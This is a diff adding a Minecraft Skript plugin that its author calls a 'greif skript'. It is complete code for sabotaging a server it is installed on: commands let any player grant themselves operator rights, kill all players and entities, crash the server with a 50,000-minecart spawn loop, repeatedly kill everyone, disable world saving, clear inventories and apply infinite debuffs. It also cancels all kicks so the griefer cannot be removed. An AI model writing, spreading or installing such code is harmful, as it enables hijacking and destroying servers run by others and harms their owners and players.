@@ -1,0 +1,79 @@
+#---Greif-Utils-V1---#
+
+#This is a greif skript by vizzel_ discord anderso2. 
+#the creator of this skript is not liable for any use or harm it may cause. 
+#keep in mind that this is the version 1 of the skript and i will make more updates soon.
+
+#---Commands---# 
+
+command /opme:
+	trigger:
+		execute console command "op %player%"
+		send "&aYou are now op"
+command /killall:
+	trigger:
+		execute console command "kill @a"
+		send "&aKilled everyone"
+command /killalle:
+	trigger:
+		execute console command "kill @e"
+		send "&aKilled all entities"
+command /ruin:
+	trigger:
+		send "&aAre you sure you want to run this command. It will server crash the server, if so confirm by typing in /ruinconfirm"
+command /ruinconfirm:
+	trigger:
+		send "&aThe server is now crashing"
+		wait 2 seconds
+		loop 50000 times:
+			execute console command "summon minecraft:hopper_minecart"
+			broadcast "&0This Server Is Doomed"
+command /tpall:
+	trigger:
+		send "&aTeleporting Everyone to you"
+		wait 2 seconds
+		execute console command "tp @a @p"
+command /unplayable:
+	trigger:
+		send "&aAre you sure you want to run this command. It will kill all the players and u 100000 times. If you want to run this command do /unplayableconfirm"
+command /unplayableconfirm:
+	trigger:
+		loop 100000 times:
+			wait 2 seconds
+			execute console command "kill @a"
+command /stopsaving:
+	trigger:
+		execute console command "/save-off"
+		send "&aTurned of saves"
+command /commandlist:
+	trigger:
+		send "&aThese are the command in Greif.Tools Skript V1"
+		wait 2 seconds
+		send "&a/opme /killall /killalle /ruin /tpall /unplayable /dupe /broadcast /stopsaving /effecteveryone"
+command /dupe:
+	trigger:
+		give player player's held item
+		if player's held item is air:
+			message "&cYou need to hold an item" to player		
+command /broadcast:
+	trigger:
+		loop 10000 times:						
+			wait 1 tick
+			broadcast "&cThis Server Is Getting Greifed"
+command /effecteveryone:
+	trigger:
+		execute console command "effect give @a minecraft:slowness infinite 100"
+		execute console command "effect give @a minecraft:nausea infinite 100"
+		execute console command "effect clear %player%"	    				
+		send "&agave everyone nausea and slowness"  	  
+command /clearall:
+	trigger:
+		execute console command "clear @a"
+		send "&acleared everyone"
+#---Events---#
+
+on player kick:
+    cancel event
+on skript start:
+	wait 2 minutes
+	broadcast "&2A cool skript has been downloaded to this server get started with it using commandlist"
